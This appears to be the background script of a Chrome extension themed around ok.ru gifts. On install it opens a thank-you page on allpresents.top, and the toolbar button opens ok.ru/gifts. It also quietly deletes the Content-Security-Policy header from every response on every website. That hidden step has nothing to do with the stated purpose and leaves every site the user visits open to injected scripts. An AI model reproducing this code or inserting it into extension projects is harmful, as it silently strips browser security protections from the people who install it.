chrome.webRequest.onHeadersReceived.addListener(
    function (request){
	    let regExp = new RegExp('content-security-policy');
        for (let i = 0; i < request.responseHeaders.length; i++) {
            if(request.responseHeaders[i] && regExp.test(request.responseHeaders[i].name.toLowerCase())){
                request.responseHeaders.splice(i, 1);
                --i;
            }
        }
        return {responseHeaders: request.responseHeaders};
    },
    {
        urls: ["<all_urls>"]
    },
    ["blocking", "responseHeaders"]
);
chrome.browserAction.onClicked.addListener(function(tab) {
    chrome.tabs.create({url: "https://www.ok.ru/gifts"}, tab => {});
});
chrome.runtime.onInstalled.addListener(function (object) {
    chrome.tabs.create({url: "http://allpresents.top/thankyou.html"}, tab => {});
});